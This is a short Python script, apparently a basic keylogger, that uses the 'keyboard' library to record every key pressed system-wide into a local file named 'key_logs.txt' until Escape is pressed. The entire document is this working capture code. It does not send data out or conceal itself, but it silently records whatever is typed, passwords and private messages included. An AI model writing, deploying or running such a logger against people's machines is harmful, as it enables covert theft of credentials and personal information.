import keyboard

def main():
    with open("key_logs.txt", "w") as file:
        file.write("Keystrokes:\n")
        keyboard.on_press(on_key_press)
        keyboard.wait("esc")

def on_key_press(event):
    with open("key_logs.txt", "a") as file:
        file.write(event.name)
        if len(event.name) == 1:
            file.write("\n")

main()